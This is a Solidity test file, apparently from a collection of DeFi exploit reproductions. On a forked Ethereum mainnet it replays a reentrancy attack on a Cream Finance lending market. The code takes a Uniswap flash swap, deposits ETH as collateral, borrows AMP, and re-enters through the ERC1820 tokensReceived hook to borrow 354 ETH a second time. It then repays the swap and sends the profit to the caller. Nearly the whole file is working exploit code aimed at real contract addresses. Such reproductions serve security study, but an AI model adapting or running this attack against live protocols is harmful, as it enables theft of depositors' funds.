// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "ds-test/test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
  AMP amp = AMP(0xfF20817765cB7f73d4bde2e66e067E58D11095C2);

  IERC1820Registry ierc1820 =
    IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

  bytes32 constant TOKENS_RECIPIENT_INTERFACE_HASH =
    0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;

  Uni_Pair_V2 uni = Uni_Pair_V2(0xd3d2E2692501A5c9Ca623199D38826e513033a17);

  address constant WTH9_AMP_Pair_Address =
    0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;
  address constant uin_WTH9_Pair_Address =
    0xd3d2E2692501A5c9Ca623199D38826e513033a17;

  WETH9 weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

  crETH creth = crETH(0xD06527D5e56A3495252A528C4987003b712860eE);

  crAMP cramp = crAMP(0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6);

  Uni_Router_V2 unirouterv2 =
    Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
  address constant UniswapV2Router02_address =
    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  address constant crETH_Address = 0xD06527D5e56A3495252A528C4987003b712860eE;

  address public mywallet;

  address[] path = [
    0xfF20817765cB7f73d4bde2e66e067E58D11095C2,
    0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  ];
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("mainnet", 13125070); // fork mainnet at block 13125070
  }

  function test() public {
    payable(address(0)).transfer(address(this).balance);
    ierc1820.setInterfaceImplementer(
      address(this),
      TOKENS_RECIPIENT_INTERFACE_HASH,
      address(this)
    );

    mywallet = msg.sender;
    uni.swap(0, 500 * 1e18, address(this), "0x00");
    emit log_named_uint(
      "Exploit completed, WETH Balance",
      weth.balanceOf(mywallet)
    );
  }

  function uniswapV2Call(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external {
    weth.withdraw(500 * 1e18);
    creth.mint{ value: 500 * 1e18 }();
    creth.borrow(1 * 1e18);
    cramp.accrueInterest();
    cramp.borrow(19480000000000000000000000);
    weth.deposit{ value: address(this).balance, gas: 40000 }();
    amp.approve(UniswapV2Router02_address, 19480000000000000000000000000);
    unirouterv2.swapExactTokensForTokens(
      19480000000000000000000000,
      1,
      path,
      address(this),
      block.timestamp
    );
    weth.transfer(uin_WTH9_Pair_Address, 502 * 1e18);
    weth.transfer(mywallet, weth.balanceOf(address(this)));
  }

  function tokensReceived(
    bytes4 functionSig,
    bytes32 partition,
    address operator,
    address from,
    address to,
    uint256 value,
    bytes calldata data,
    bytes calldata operatorData
  ) external {
    crETH(crETH_Address).borrow(354 * 1e18);
  }

  receive() external payable {}
}
